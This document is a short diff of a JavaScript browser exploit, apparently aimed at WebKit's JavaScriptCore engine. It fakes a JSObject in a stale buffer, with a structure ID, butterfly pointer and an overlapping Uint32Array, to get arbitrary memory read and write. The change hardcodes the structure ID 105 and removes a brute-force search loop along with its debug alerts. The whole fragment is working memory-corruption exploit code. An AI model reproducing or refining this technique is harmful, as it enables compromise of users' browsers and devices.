@@ -200,9 +200,9 @@ function go_() {
 				//bufs.push(stale);
 				//stale[0] = fc;
 				//fcp = bufs[i][k];
-				structID = 100;
+
 				stale[0] = {
-					'a': u2d(structID, 0x1172600), // the JSObject properties
+					'a': u2d(105, 0x1172600), // the JSObject properties
 					'b': u2d(0, 0), // Butterfly ptr
 					'c': smsh, // var smsh = new Uint32Array(0x10)
 					'd': u2d(0x100, 0)
@@ -232,13 +232,6 @@ function go_() {
 
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
-
-				while(!(stale[0] instanceof Uint32Array)) {
-					structID++;
-					stale[1]['a'] = u2d(structID, 0);
-				}
-				alert('found structID for Uint32Array = ' + structID);
-				alert('stale[0] is now: ' + stale[0]);
 
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
